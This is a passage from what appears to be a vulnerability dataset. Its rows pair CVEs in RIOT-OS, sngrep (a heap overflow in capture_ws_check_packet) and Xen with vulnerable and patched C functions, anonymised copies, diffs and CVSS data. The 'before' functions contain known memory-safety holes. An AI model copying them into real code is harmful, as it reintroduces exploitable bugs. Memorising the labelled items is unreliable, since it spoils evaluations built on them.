                          (uint8_t)VAR_0->tag, _frag_ack_req(VAR_3),
                          _frag_seq(VAR_3), _frag_size(VAR_3),
                          VAR_3->offset);
                    /* COMMENT_24 */
                                                                             
                                                  
                    _retry_datagram(VAR_0);
                    return;
                }
            }
            else {
                /* COMMENT_27 */
                                                                        
                                                                              
                                                                         
                                                      
                DEBUG(""6lo sfr: nothing to do for fragment %u\n"",
                      _frag_seq(VAR_3));
            }
        } while (VAR_3 != VAR_10);
        /* COMMENT_32 */
                                                                        
                                             
        clist_foreach(&VAR_0->sfr.window, VAR_17, VAR_0);
    }
    else {
        /* COMMENT_35 */
                          
        VAR_6 = VAR_18;
    }
    assert(VAR_0->sfr.frags_sent == clist_count(&VAR_0->sfr.window));
    if (VAR_5) {
        _sched_arq_timeout(VAR_0, VAR_4);
        return;
    }
error:
    /* COMMENT_37 */
    _send_abort_frag(VAR_0->pkt, VAR_0, false, 0);
    _clean_up_fbuf(VAR_0, VAR_6);
}",RIOT-OS/RIOT/31c6191f6196f1a05c9765cffeadba868e3b0723/gnrc_sixlowpan_frag_sfr.c/vul/after/2.json,"--- func_before
+++ func_after
@@ -7,7 +7,6 @@
     int error_no = ETIMEDOUT;   /* assume time out for fbuf->pkt */
 
     DEBUG(""6lo sfr: ARQ timeout for datagram %u\n"", fbuf->tag);
-    fbuf->sfr.arq_timeout_event.msg.content.ptr = NULL;
     if (IS_ACTIVE(CONFIG_GNRC_SIXLOWPAN_SFR_MOCK_ARQ_TIMER)) {
         /* mock-up to emulate time having passed beyond (1us) the ARQ timeout */
         now -= (fbuf->sfr.arq_timeout * US_PER_MS) + 1;","{'deleted_lines': ['    fbuf->sfr.arq_timeout_event.msg.content.ptr = NULL;'], 'added_lines': []}",True,"RIOT-OS, an operating system for Internet of Things (IoT) devices, contains a network stack with the ability to process 6LoWPAN frames. In versions 2023.01 and prior, an attacker can send multiple crafted frames to the device to trigger a race condition. The race condition invalidates assumptions about the program state and leads to an invalid memory access resulting in denial of service. This issue is patched in pull request 19679. There are no known workarounds.",7.5,HIGH,2,valid,2023-05-30T12:32:18Z,4
CVE-2023-36192,['CWE-787'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,irontec/sngrep,capture: properly validate WS packet payload size #438,ad1daf15c8387bfbb48097c25197bf330d2d98fc,https://github.com/irontec/sngrep/commit/ad1daf15c8387bfbb48097c25197bf330d2d98fc,src/capture.c,capture_ws_check_packet,"int
capture_ws_check_packet(packet_t *packet)
{
int ws_off = 0;
u_char ws_opcode;
u_char ws_mask;
uint8_t ws_len;
u_char ws_mask_key[4];
u_char *payload, *newpayload;
uint32_t size_payload;
int i;
size_payload = packet_payloadlen(packet);
payload = packet_payload(packet);
if (size_payload == 0)
return 0;
ws_opcode = *payload & WH_OPCODE;
ws_off++;
if (ws_opcode != WS_OPCODE_TEXT)
return 0;
ws_mask = (*(payload + ws_off) & WH_MASK) >> 4;
ws_len = (*(payload + ws_off) & WH_LEN);
ws_off++;
switch (ws_len) {
case 126:
ws_off += 2;
break;
case 127:
ws_off += 8;
break;
default:
return 0;
}
if (ws_mask) {
memcpy(ws_mask_key, (payload + ws_off), 4);
ws_off += 4;
}
size_payload -= ws_off;
if ((int32_t) size_payload <= 0)
return 0;
newpayload = sng_malloc(size_payload);
memcpy(newpayload, payload + ws_off, size_payload);
if (ws_mask) {
for (i = 0; i < size_payload; i++)
newpayload[i] = newpayload[i] ^ ws_mask_key[i % 4];
}
packet_set_payload(packet, newpayload, size_payload);
sng_free(newpayload);
if (packet->type == PACKET_SIP_TLS) {
packet_set_type(packet, PACKET_SIP_WSS);
} else {
packet_set_type(packet, PACKET_SIP_WS);
}
return 1;
}","int
capture_ws_check_packet(packet_t *VAR_0)
{
int VAR_1 = 0;
u_char VAR_2;
u_char VAR_3;
uint8_t VAR_4;
u_char VAR_5[4];
u_char *VAR_6, *VAR_7;
uint32_t VAR_8;
int VAR_9;
VAR_8 = packet_payloadlen(VAR_0);
VAR_6 = packet_payload(VAR_0);
if (VAR_8 == 0)
return 0;
VAR_2 = *VAR_6 & VAR_10;
VAR_1++;
if (VAR_2 != VAR_11)
return 0;
VAR_3 = (*(VAR_6 + VAR_1) & VAR_12) >> 4;
VAR_4 = (*(VAR_6 + VAR_1) & VAR_13);
VAR_1++;
switch (VAR_4) {
case 126:
VAR_1 += 2;
break;
case 127:
VAR_1 += 8;
break;
default:
return 0;
}
if (VAR_3) {
memcpy(VAR_5, (VAR_6 + VAR_1), 4);
VAR_1 += 4;
}
VAR_8 -= VAR_1;
if ((int32_t) VAR_8 <= 0)
return 0;
VAR_7 = sng_malloc(VAR_8);
memcpy(VAR_7, VAR_6 + VAR_1, VAR_8);
if (VAR_3) {
for (VAR_9 = 0; VAR_9 < VAR_8; VAR_9++)
VAR_7[VAR_9] = VAR_7[VAR_9] ^ VAR_5[VAR_9 % 4];
}
packet_set_payload(VAR_0, VAR_7, VAR_8);
sng_free(VAR_7);
if (VAR_0->type == VAR_14) {
packet_set_type(VAR_0, VAR_15);
} else {
packet_set_type(VAR_0, VAR_16);
}
return 1;
}",irontec/sngrep/ad1daf15c8387bfbb48097c25197bf330d2d98fc/capture.c/vul/before/0.json,"int
capture_ws_check_packet(packet_t *packet)
{
    int ws_off = 0;
    u_char ws_opcode;
    u_char ws_mask;
    uint8_t ws_len;
    u_char ws_mask_key[4];
    u_char *payload, *newpayload;
    uint32_t size_payload;
    int i;

    /**
     * WSocket header definition according to RFC 6455
     *     0                   1                   2                   3
     *     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
     *    +-+-+-+-+-------+-+-------------+-------------------------------+
     *    |F|R|R|R| opcode|M| Payload len |    Extended payload length    |
     *    |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
     *    |N|V|V|V|       |S|             |   (if payload len==126/127)   |
     *    | |1|2|3|       |K|             |                               |
     *    +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
     *    |     Extended payload length continued, if payload len == 127  |
     *    + - - - - - - - - - - - - - - - +-------------------------------+
     *    |                               |Masking-key, if MASK set to 1  |
     *    +-------------------------------+-------------------------------+
     *    | Masking-key (continued)       |          Payload Data         |
     *    +-------------------------------- - - - - - - - - - - - - - - - +
     *    :                     Payload Data continued ...                :
     *    + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
     *    |                     Payload Data continued ...                |
     *    +---------------------------------------------------------------+
     */

    // Get payload from packet(s)
    size_payload = packet_payloadlen(packet);
    payload = packet_payload(packet);

    // Check we have enough payload (base)
    if (size_payload == 0 || size_payload <= 2)
        return 0;

    // Flags && Opcode
    ws_opcode = *payload & WH_OPCODE;
    ws_off++;

    // Only interested in Ws text packets
    if (ws_opcode != WS_OPCODE_TEXT)
        return 0;

    // Masked flag && Payload len
    ws_mask = (*(payload + ws_off) & WH_MASK) >> 4;
    ws_len = (*(payload + ws_off) & WH_LEN);
    ws_off++;

    // Skip Payload len
    switch (ws_len) {
            // Extended
        case 126:
            ws_off += 2;
            break;
        case 127:
            ws_off += 8;
            break;
        default:
            return 0;
    }

    // Check we have enough payload (base + extended payload headers)
    if ((int32_t) size_payload - ws_off <= 0) {
        return 0;
    }

    // Get Masking key if mask is enabled
    if (ws_mask) {
        // Check we have enough payload (base + extended payload headers + mask)
        if ((int32_t) size_payload - ws_off - 4 <= 0) {
            return 0;
        }
        memcpy(ws_mask_key, (payload + ws_off), 4);
        ws_off += 4;
    }

    // Skip Websocket headers
    size_payload -= ws_off;
    if ((int32_t) size_payload <= 0)
        return 0;

    newpayload = sng_malloc(size_payload);
    memcpy(newpayload, payload + ws_off, size_payload);
    // If mask is enabled, unmask the payload
    if (ws_mask) {
        for (i = 0; i < size_payload; i++)
            newpayload[i] = newpayload[i] ^ ws_mask_key[i % 4];
    }
    // Set new packet payload into the packet
    packet_set_payload(packet, newpayload, size_payload);
    // Free the new payload
    sng_free(newpayload);

    if (packet->type == PACKET_SIP_TLS) {
        packet_set_type(packet, PACKET_SIP_WSS);
    } else {
        packet_set_type(packet, PACKET_SIP_WS);
    }
    return 1;
}","int
capture_ws_check_packet(packet_t *VAR_0)
{
    int VAR_1 = 0;
    u_char VAR_2;
    u_char VAR_3;
    uint8_t VAR_4;
    u_char VAR_5[4];
    u_char *VAR_6, *VAR_7;
    uint32_t VAR_8;
    int VAR_9;

    /* COMMENT_0 */
                                                      
                                                                        
                                                                          
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
                                                                           
       

    /* COMMENT_21 */
    VAR_8 = packet_payloadlen(VAR_0);
    VAR_6 = packet_payload(VAR_0);

    /* COMMENT_22 */
    if (VAR_8 == 0 || VAR_8 <= 2)
        return 0;

    /* COMMENT_23 */
    VAR_2 = *VAR_6 & VAR_10;
    VAR_1++;

    /* COMMENT_24 */
    if (VAR_2 != VAR_11)
        return 0;

    /* COMMENT_25 */
    VAR_3 = (*(VAR_6 + VAR_1) & VAR_12) >> 4;
    VAR_4 = (*(VAR_6 + VAR_1) & VAR_13);
    VAR_1++;

    /* COMMENT_26 */
    switch (VAR_4) {
            /* COMMENT_27 */
        case 126:
            VAR_1 += 2;
            break;
        case 127:
            VAR_1 += 8;
            break;
        default:
            return 0;
    }

    /* COMMENT_28 */
    if ((int32_t) VAR_8 - VAR_1 <= 0) {
        return 0;
    }

    /* COMMENT_29 */
    if (VAR_3) {
        /* COMMENT_30 */
        if ((int32_t) VAR_8 - VAR_1 - 4 <= 0) {
            return 0;
        }
        memcpy(VAR_5, (VAR_6 + VAR_1), 4);
        VAR_1 += 4;
    }

    /* COMMENT_31 */
    VAR_8 -= VAR_1;
    if ((int32_t) VAR_8 <= 0)
        return 0;

    VAR_7 = sng_malloc(VAR_8);
    memcpy(VAR_7, VAR_6 + VAR_1, VAR_8);
    /* COMMENT_32 */
    if (VAR_3) {
        for (VAR_9 = 0; VAR_9 < VAR_8; VAR_9++)
            VAR_7[VAR_9] = VAR_7[VAR_9] ^ VAR_5[VAR_9 % 4];
    }
    /* COMMENT_33 */
    packet_set_payload(VAR_0, VAR_7, VAR_8);
    /* COMMENT_34 */
    sng_free(VAR_7);

    if (VAR_0->type == VAR_14) {
        packet_set_type(VAR_0, VAR_15);
    } else {
        packet_set_type(VAR_0, VAR_16);
    }
    return 1;
}",irontec/sngrep/ad1daf15c8387bfbb48097c25197bf330d2d98fc/capture.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -36,8 +36,8 @@
     size_payload = packet_payloadlen(packet);
     payload = packet_payload(packet);
 
-    // Check we have payload
-    if (size_payload == 0)
+    // Check we have enough payload (base)
+    if (size_payload == 0 || size_payload <= 2)
         return 0;
 
     // Flags && Opcode
@@ -66,8 +66,17 @@
             return 0;
     }
 
+    // Check we have enough payload (base + extended payload headers)
+    if ((int32_t) size_payload - ws_off <= 0) {
+        return 0;
+    }
+
     // Get Masking key if mask is enabled
     if (ws_mask) {
+        // Check we have enough payload (base + extended payload headers + mask)
+        if ((int32_t) size_payload - ws_off - 4 <= 0) {
+            return 0;
+        }
         memcpy(ws_mask_key, (payload + ws_off), 4);
         ws_off += 4;
     }","{'deleted_lines': ['    // Check we have payload', '    if (size_payload == 0)'], 'added_lines': ['    // Check we have enough payload (base)', '    if (size_payload == 0 || size_payload <= 2)', '    // Check we have enough payload (base + extended payload headers)', '    if ((int32_t) size_payload - ws_off <= 0) {', '        return 0;', '    }', '', '        // Check we have enough payload (base + extended payload headers + mask)', '        if ((int32_t) size_payload - ws_off - 4 <= 0) {', '            return 0;', '        }']}",True,Sngrep v1.6.0 was discovered to contain a heap buffer overflow via the function capture_ws_check_packet at /src/capture.c.,7.8,HIGH,2,valid,2023-06-09T12:29:29Z,4
CVE-2023-20569,['CWE-203'],CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N,1,xen-project/xen,"x86/spec-ctrl: Enumerations for Speculative Return Stack Overflow

AMD have specified new CPUID bits relating to SRSO.

 * SRSO_NO indicates that hardware is no longer vulnerable to SRSO.
 * IBPB_BRTYPE indicates that IBPB flushes branch type information too.
 * SBPB indicates support for a relaxed form of IBPB that does not flush
   branch type information.

Current CPUs (Zen4 and older) are not expected to enumerate these bits.
Native software is expected to synthesise them for guests using model and
microcode revision checks.

Two are just status bits, and SBPB is trivial to support for guests by
tweaking the reserved bit calculation in guest_wrmsr() and feature
dependencies.  Expose all by default to guests, so they start showing up when
Xen synthesises them.

While adding feature dependenies for IBPB, fix up an overlooked issue from
XSA-422.  It's inappropriate to advertise that IBPB flushes RET predictions if
IBPB is unavailable itself.

This is part of XSA-434 / CVE-2023-20569

Signed-off-by: Andrew Cooper <andrew.cooper3@citrix.com>
Reviewed-by: Jan Beulich <jbeulich@suse.com>
Reviewed-by: Roger Pau Monn <roger.pau@citrix.com>",2280b0ee2aed6e0fd4af3fa31bf99bc04d038bfe,https://github.com/xen-project/xen/commit/2280b0ee2aed6e0fd4af3fa31bf99bc04d038bfe,xen/arch/x86/msr.c,guest_wrmsr,"int guest_wrmsr(struct vcpu *v, uint32_t msr, uint64_t val)
{
const struct vcpu *curr = current;
struct domain *d = v->domain;
const struct cpu_policy *cp = d->arch.cpu_policy;
struct vcpu_msrs *msrs = v->arch.msrs;
int ret = X86EMUL_OKAY;
switch ( msr )
{
uint64_t rsvd;
case MSR_IA32_PLATFORM_ID:
case MSR_CORE_CAPABILITIES:
case MSR_INTEL_CORE_THREAD_COUNT:
case MSR_INTEL_PLATFORM_INFO:
case MSR_ARCH_CAPABILITIES:
case MSR_TEST_CTRL:
case MSR_TSX_FORCE_ABORT:
case MSR_TSX_CTRL:
case MSR_MCU_OPT_CTRL:
case MSR_RTIT_OUTPUT_BASE ... MSR_RTIT_ADDR_B(7):
case MSR_U_CET:
case MSR_S_CET:
case MSR_PL0_SSP ... MSR_INTERRUPT_SSP_TABLE:
case MSR_AMD64_LWP_CFG:
case MSR_AMD64_LWP_CBADDR:
case MSR_PPIN_CTL:
case MSR_PPIN:
case MSR_AMD_PPIN_CTL:
case MSR_AMD_PPIN:
goto gp_fault;
case MSR_AMD_PATCHLEVEL:
BUILD_BUG_ON(MSR_IA32_UCODE_REV != MSR_AMD_PATCHLEVEL);
if ( cp->x86_vendor != X86_VENDOR_INTEL || val != 0 )
goto gp_fault;
break;
case MSR_AMD_PATCHLOADER:
if ( is_pv_domain(d) ||
cp->x86_vendor != X86_VENDOR_AMD )
goto gp_fault;
break;
case MSR_IA32_UCODE_WRITE:
if ( is_pv_domain(d) ||
cp->x86_vendor != X86_VENDOR_INTEL )
goto gp_fault;
break;
case MSR_SPEC_CTRL:
if ( (!cp->feat.ibrsb && !cp->extd.ibrs) ||
(val & ~msr_spec_ctrl_valid_bits(cp)) )
goto gp_fault;
goto set_reg;
case MSR_PRED_CMD:
if ( !cp->feat.ibrsb && !cp->extd.ibpb )
goto gp_fault; 
if ( val & ~PRED_CMD_IBPB )
goto gp_fault; 
if ( v == curr )
wrmsrl(MSR_PRED_CMD, val);
break;
case MSR_FLUSH_CMD:
if ( !cp->feat.l1d_flush )
goto gp_fault; 
if ( val & ~FLUSH_CMD_L1D )
goto gp_fault; 
if ( v == curr )
wrmsrl(MSR_FLUSH_CMD, val);
break;
case MSR_INTEL_MISC_FEATURES_ENABLES:
{
bool old_cpuid_faulting = msrs->misc_features_enables.cpuid_faulting;
rsvd = ~0ULL;
if ( cp->platform_info.cpuid_faulting )
rsvd &= ~MSR_MISC_FEATURES_CPUID_FAULTING;
if ( val & rsvd )
goto gp_fault;
msrs->misc_features_enables.raw = val;
if ( v == curr && is_hvm_domain(d) && cpu_has_cpuid_faulting &&
(old_cpuid_faulting ^ msrs->misc_features_enables.cpuid_faulting) )
ctxt_switch_levelling(v);
break;
}
case MSR_IA32_MCG_CAP     ... MSR_IA32_MCG_CTL:      
case MSR_IA32_MCx_CTL2(0) ... MSR_IA32_MCx_CTL2(31): 
case MSR_IA32_MCx_CTL(0)  ... MSR_IA32_MCx_MISC(31): 
case MSR_IA32_MCG_EXT_CTL:                           
if ( vmce_wrmsr(msr, val) < 0 )
goto gp_fault;
break;
case MSR_IA32_PERF_CTL:
if ( !(cp->x86_vendor & (X86_VENDOR_INTEL | X86_VENDOR_CENTAUR)) )
goto gp_fault;
if ( likely(!is_cpufreq_controller(d)) || wrmsr_safe(msr, val) == 0 )
break;
goto gp_fault;
case MSR_PKRS:
if ( !cp->feat.pks || val != (uint32_t)val )
goto gp_fault;
goto set_reg;
case MSR_X2APIC_FIRST ... MSR_X2APIC_LAST:
if ( !is_hvm_domain(d) || v != curr )
goto gp_fault;
ret = guest_wrmsr_x2apic(v, msr, val);
break;
#ifdef CONFIG_HVM
case MSR_IA32_BNDCFGS:
if ( !cp->feat.mpx || 
!is_canonical_address(val) || (val & IA32_BNDCFGS_RESERVED) )
goto gp_fault;
if ( (val & IA32_BNDCFGS_ENABLE) &&
!(v->arch.xcr0_accum & (X86_XCR0_BNDREGS | X86_XCR0_BNDCSR)) )
{
uint64_t xcr0 = get_xcr0();
if ( v != curr ||
handle_xsetbv(XCR_XFEATURE_ENABLED_MASK,
xcr0 | X86_XCR0_BNDREGS | X86_XCR0_BNDCSR) )
goto gp_fault;
if ( handle_xsetbv(XCR_XFEATURE_ENABLED_MASK, xcr0) )
;
}
goto set_reg;
#endif 
case MSR_IA32_XSS:
if ( !cp->xstate.xsaves )
goto gp_fault;
if ( val != 0 )
goto gp_fault;
msrs->xss.raw = val;
break;
case 0x40000000 ... 0x400001ff:
if ( is_viridian_domain(d) )
{
ret = guest_wrmsr_viridian(v, msr, val);
break;
}
case 0x40000200 ... 0x400002ff:
ret = guest_wrmsr_xen(v, msr, val);
break;
case MSR_TSC_AUX:
if ( !cp->extd.rdtscp && !cp->feat.rdpid )
goto gp_fault;
if ( val != (uint32_t)val )
goto gp_fault;
msrs->tsc_aux = val;
if ( v == curr )
wrmsr_tsc_aux(val);
break;
case MSR_VIRT_SPEC_CTRL:
if ( !cp->extd.virt_ssbd )
goto gp_fault;
if ( cpu_has_amd_ssbd )
{
if ( val & SPEC_CTRL_SSBD )
msrs->spec_ctrl.raw |= SPEC_CTRL_SSBD;
else
msrs->spec_ctrl.raw &= ~SPEC_CTRL_SSBD;
}
else
{
msrs->virt_spec_ctrl.raw = val & SPEC_CTRL_SSBD;
if ( v == curr )
amd_set_legacy_ssbd(val & SPEC_CTRL_SSBD);
}
break;
case MSR_AMD64_DE_CFG:
if ( !(cp->x86_vendor & (X86_VENDOR_AMD | X86_VENDOR_HYGON)) )
goto gp_fault;
break;
case MSR_AMD64_DR0_ADDRESS_MASK:
case MSR_AMD64_DR1_ADDRESS_MASK ... MSR_AMD64_DR3_ADDRESS_MASK:
if ( !cp->extd.dbext || val != (uint32_t)val )
goto gp_fault;
msrs->dr_mask[
array_index_nospec((msr == MSR_AMD64_DR0_ADDRESS_MASK)
? 0 : (msr - MSR_AMD64_DR1_ADDRESS_MASK + 1),
ARRAY_SIZE(msrs->dr_mask))] = val;
if ( v == curr && (curr->arch.dr7 & DR7_ACTIVE_MASK) )
wrmsrl(msr, val);
break;
default:
return X86EMUL_UNHANDLEABLE;
}
ASSERT(ret != X86EMUL_UNHANDLEABLE);
return ret;
set_reg: 
if ( is_pv_domain(d) )
pv_set_reg(v, msr, val);
else
hvm_set_reg(v, msr, val);
return X86EMUL_OKAY;
gp_fault:
return X86EMUL_EXCEPTION;
}","int guest_wrmsr(struct vcpu *VAR_0, uint32_t VAR_1, uint64_t VAR_2)
{
const struct vcpu *VAR_3 = VAR_4;
struct domain *VAR_5 = VAR_0->domain;
const struct cpu_policy *VAR_6 = VAR_5->arch.cpu_policy;
struct vcpu_msrs *VAR_7 = VAR_0->arch.msrs;
int VAR_8 = VAR_9;
switch ( VAR_1 )
{
uint64_t VAR_10;
case VAR_11:
case VAR_12:
case VAR_13:
case VAR_14:
case VAR_15:
case VAR_16:
case VAR_17:
case VAR_18:
case VAR_19:
case VAR_20 ... MSR_RTIT_ADDR_B(7):
case VAR_21:
case VAR_22:
case VAR_23 ... MSR_INTERRUPT_SSP_TABLE:
case VAR_24:
case VAR_25:
case VAR_26:
case VAR_27:
case VAR_28:
case VAR_29:
goto gp_fault;
case VAR_30:
BUILD_BUG_ON(VAR_31 != VAR_30);
if ( VAR_6->x86_vendor != VAR_32 || VAR_2 != 0 )
goto gp_fault;
break;
case VAR_33:
if ( is_pv_domain(VAR_5) ||
VAR_6->x86_vendor != VAR_34 )
goto gp_fault;
break;
case VAR_35:
if ( is_pv_domain(VAR_5) ||
VAR_6->x86_vendor != VAR_32 )
goto gp_fault;
break;
case VAR_36:
if ( (!VAR_6->feat.ibrsb && !VAR_6->extd.ibrs) ||
(VAR_2 & ~msr_spec_ctrl_valid_bits(VAR_6)) )
goto gp_fault;
goto set_reg;
case VAR_37:
if ( !VAR_6->feat.ibrsb && !VAR_6->extd.ibpb )
goto gp_fault; 
if ( VAR_2 & ~VAR_38 )
goto gp_fault; 
if ( VAR_0 == VAR_3 )
wrmsrl(VAR_37, VAR_2);
break;
case VAR_39:
if ( !VAR_6->feat.l1d_flush )
goto gp_fault; 
if ( VAR_2 & ~VAR_40 )
goto gp_fault; 
if ( VAR_0 == VAR_3 )
wrmsrl(VAR_39, VAR_2);
break;
case VAR_41:
{
bool VAR_42 = VAR_7->misc_features_enables.cpuid_faulting;
VAR_10 = ~0ULL;
if ( VAR_6->platform_info.cpuid_faulting )
VAR_10 &= ~VAR_43;
if ( VAR_2 & VAR_10 )
goto gp_fault;
VAR_7->misc_features_enables.raw = VAR_2;
if ( VAR_0 == VAR_3 && is_hvm_domain(VAR_5) && VAR_44 &&
(VAR_42 ^ VAR_7->misc_features_enables.cpuid_faulting) )
ctxt_switch_levelling(VAR_0);
break;
}
case VAR_45     ... MSR_IA32_MCG_CTL:      
case MSR_IA32_MCx_CTL2(0) ... MSR_IA32_MCx_CTL2(31): 
case MSR_IA32_MCx_CTL(0)  ... MSR_IA32_MCx_MISC(31): 
case VAR_46:                           
if ( vmce_wrmsr(VAR_1, VAR_2) < 0 )
goto gp_fault;
break;
case VAR_47:
if ( !(VAR_6->x86_vendor & (VAR_32 | VAR_48)) )
goto gp_fault;
if ( likely(!is_cpufreq_controller(VAR_5)) || wrmsr_safe(VAR_1, VAR_2) == 0 )
break;
goto gp_fault;
case VAR_49:
if ( !VAR_6->feat.pks || VAR_2 != (uint32_t)VAR_2 )
goto gp_fault;
goto set_reg;
case VAR_50 ... MSR_X2APIC_LAST:
if ( !is_hvm_domain(VAR_5) || VAR_0 != VAR_3 )
goto gp_fault;
VAR_8 = guest_wrmsr_x2apic(VAR_0, VAR_1, VAR_2);
break;
#ifdef VAR_51
case VAR_52:
if ( !VAR_6->feat.mpx || 
!is_canonical_address(VAR_2) || (VAR_2 & VAR_53) )
goto gp_fault;
if ( (VAR_2 & VAR_54) &&
!(VAR_0->arch.xcr0_accum & (VAR_55 | VAR_56)) )
{
uint64_t VAR_57 = get_xcr0();
if ( VAR_0 != VAR_3 ||
handle_xsetbv(VAR_58,
VAR_57 | VAR_55 | VAR_56) )
goto gp_fault;
if ( handle_xsetbv(VAR_58, VAR_57) )
;
}
goto set_reg;
#endif 
case VAR_59:
if ( !VAR_6->xstate.xsaves )
goto gp_fault;
if ( VAR_2 != 0 )
goto gp_fault;
VAR_7->xss.raw = VAR_2;
break;
case 0x40000000 ... 0x400001ff:
if ( is_viridian_domain(VAR_5) )
{
VAR_8 = guest_wrmsr_viridian(VAR_0, VAR_1, VAR_2);
break;
}
case 0x40000200 ... 0x400002ff:
VAR_8 = guest_wrmsr_xen(VAR_0, VAR_1, VAR_2);
break;
case VAR_60:
if ( !VAR_6->extd.rdtscp && !VAR_6->feat.rdpid )
goto gp_fault;
if ( VAR_2 != (uint32_t)VAR_2 )
goto gp_fault;
VAR_7->tsc_aux = VAR_2;
if ( VAR_0 == VAR_3 )
wrmsr_tsc_aux(VAR_2);
break;
case VAR_61:
if ( !VAR_6->extd.virt_ssbd )
goto gp_fault;
if ( VAR_62 )
{
if ( VAR_2 & VAR_63 )
VAR_7->spec_ctrl.raw |= VAR_63;
else
VAR_7->spec_ctrl.raw &= ~VAR_63;
}
else
{
VAR_7->virt_spec_ctrl.raw = VAR_2 & VAR_63;
if ( VAR_0 == VAR_3 )
amd_set_legacy_ssbd(VAR_2 & VAR_63);
}
break;
case VAR_64:
if ( !(VAR_6->x86_vendor & (VAR_34 | VAR_65)) )
goto gp_fault;
break;
case VAR_66:
case VAR_67 ... MSR_AMD64_DR3_ADDRESS_MASK:
if ( !VAR_6->extd.dbext || VAR_2 != (uint32_t)VAR_2 )
goto gp_fault;
VAR_7->dr_mask[
array_index_nospec((VAR_1 == VAR_66)
? 0 : (VAR_1 - VAR_67 + 1),
ARRAY_SIZE(VAR_7->dr_mask))] = VAR_2;
if ( VAR_0 == VAR_3 && (VAR_3->arch.dr7 & VAR_68) )
wrmsrl(VAR_1, VAR_2);
break;
default:
return VAR_69;
}
ASSERT(VAR_8 != VAR_69);
return VAR_8;
set_reg: 
if ( is_pv_domain(VAR_5) )
pv_set_reg(VAR_0, VAR_1, VAR_2);
else
hvm_set_reg(VAR_0, VAR_1, VAR_2);
return VAR_9;
gp_fault:
return VAR_70;
}",xen-project/xen/2280b0ee2aed6e0fd4af3fa31bf99bc04d038bfe/msr.c/vul/before/0.json,"int guest_wrmsr(struct vcpu *v, uint32_t msr, uint64_t val)
{
    const struct vcpu *curr = current;
    struct domain *d = v->domain;
    const struct cpu_policy *cp = d->arch.cpu_policy;
    struct vcpu_msrs *msrs = v->arch.msrs;
    int ret = X86EMUL_OKAY;

    switch ( msr )
    {
        uint64_t rsvd;

        /* Read-only */
    case MSR_IA32_PLATFORM_ID:
    case MSR_CORE_CAPABILITIES:
    case MSR_INTEL_CORE_THREAD_COUNT:
    case MSR_INTEL_PLATFORM_INFO:
    case MSR_ARCH_CAPABILITIES:

        /* Not offered to guests. */
    case MSR_TEST_CTRL:
    case MSR_TSX_FORCE_ABORT:
    case MSR_TSX_CTRL:
    case MSR_MCU_OPT_CTRL:
    case MSR_RTIT_OUTPUT_BASE ... MSR_RTIT_ADDR_B(7):
    case MSR_U_CET:
    case MSR_S_CET:
    case MSR_PL0_SSP ... MSR_INTERRUPT_SSP_TABLE:
    case MSR_AMD64_LWP_CFG:
    case MSR_AMD64_LWP_CBADDR:
    case MSR_PPIN_CTL:
    case MSR_PPIN:
    case MSR_AMD_PPIN_CTL:
    case MSR_AMD_PPIN:
        goto gp_fault;

    case MSR_AMD_PATCHLEVEL:
        BUILD_BUG_ON(MSR_IA32_UCODE_REV != MSR_AMD_PATCHLEVEL);
        /*
         * AMD and Intel use the same MSR for the current microcode version.
         *
         * Both document it as read-only.  However Intel also document that,
         * for backwards compatiblity, the OS should write 0 to it before
         * trying to access the current microcode version.
         */
        if ( cp->x86_vendor != X86_VENDOR_INTEL || val != 0 )
            goto gp_fault;
        break;

    case MSR_AMD_PATCHLOADER:
        /*
         * See note on MSR_IA32_UCODE_WRITE below, which may or may not apply
         * to AMD CPUs as well (at least the architectural/CPUID part does).
         */
        if ( is_pv_domain(d) ||
             cp->x86_vendor != X86_VENDOR_AMD )
            goto gp_fault;
        break;

    case MSR_IA32_UCODE_WRITE:
        /*
         * Some versions of Windows at least on certain hardware try to load
         * microcode before setting up an IDT. Therefore we must not inject #GP
         * for such attempts. Also the MSR is architectural and not qualified
         * by any CPUID bit.
         */
        if ( is_pv_domain(d) ||
             cp->x86_vendor != X86_VENDOR_INTEL )
            goto gp_fault;
        break;

    case MSR_SPEC_CTRL:
        if ( (!cp->feat.ibrsb && !cp->extd.ibrs) ||
             (val & ~msr_spec_ctrl_valid_bits(cp)) )
            goto gp_fault;
        goto set_reg;

    case MSR_PRED_CMD:
        if ( !cp->feat.ibrsb && !cp->extd.ibpb )
            goto gp_fault; /* MSR available? */

        rsvd = ~(PRED_CMD_IBPB |
                 (cp->extd.sbpb ? PRED_CMD_SBPB : 0));

        if ( val & rsvd )
            goto gp_fault; /* Rsvd bit set? */

        if ( v == curr )
            wrmsrl(MSR_PRED_CMD, val);
        break;

    case MSR_FLUSH_CMD:
        if ( !cp->feat.l1d_flush )
            goto gp_fault; /* MSR available? */

        if ( val & ~FLUSH_CMD_L1D )
            goto gp_fault; /* Rsvd bit set? */

        if ( v == curr )
            wrmsrl(MSR_FLUSH_CMD, val);
        break;

    case MSR_INTEL_MISC_FEATURES_ENABLES:
    {
        bool old_cpuid_faulting = msrs->misc_features_enables.cpuid_faulting;

        rsvd = ~0ULL;
        if ( cp->platform_info.cpuid_faulting )
            rsvd &= ~MSR_MISC_FEATURES_CPUID_FAULTING;

        if ( val & rsvd )
            goto gp_fault;

        msrs->misc_features_enables.raw = val;

        if ( v == curr && is_hvm_domain(d) && cpu_has_cpuid_faulting &&
             (old_cpuid_faulting ^ msrs->misc_features_enables.cpuid_faulting) )
            ctxt_switch_levelling(v);
        break;
    }

    case MSR_IA32_MCG_CAP     ... MSR_IA32_MCG_CTL:      /* 0x179 -> 0x17b */
    case MSR_IA32_MCx_CTL2(0) ... MSR_IA32_MCx_CTL2(31): /* 0x280 -> 0x29f */
    case MSR_IA32_MCx_CTL(0)  ... MSR_IA32_MCx_MISC(31): /* 0x400 -> 0x47f */
    case MSR_IA32_MCG_EXT_CTL:                           /* 0x4d0 */
        if ( vmce_wrmsr(msr, val) < 0 )
            goto gp_fault;
        break;

        /*
         * This MSR is not enumerated in CPUID.  It has been around since the
         * Pentium 4, and implemented by other vendors.
         *
